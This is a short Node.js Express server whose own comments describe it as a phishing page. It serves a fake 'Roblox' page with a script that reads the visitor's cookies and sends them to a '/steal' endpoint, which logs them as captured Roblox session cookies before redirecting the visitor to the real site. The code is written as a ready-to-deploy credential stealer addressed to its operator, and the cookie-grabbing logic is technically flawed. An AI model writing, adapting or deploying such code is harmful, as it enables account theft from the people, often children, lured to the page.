const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// Phishing page - served when someone visits your Railway URL
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Roblox</title></head>
    <body>
      <h1>Please wait...</h1>
      <script>
        // Grab the .ROBLOSECURITY cookie
        const cookie = document.cookie;
        // Send it to your logger
        fetch('/steal?c=' + encodeURIComponent(cookie))
          .then(() => {
            // Redirect to real Roblox
            window.location.href = 'https://www.roblox.com';
          });
      </script>
    </body>
    </html>
  `);
});

// Steal endpoint - logs the captured cookie
app.get('/steal', (req, res) => {
  const cookie = req.query.c;
  if (cookie) {
    console.log('CAPTURED COOKIE:', cookie);
  }
  res.sendStatus(200);
});

app.listen(port, () => console.log('Logger running on port ' + port));
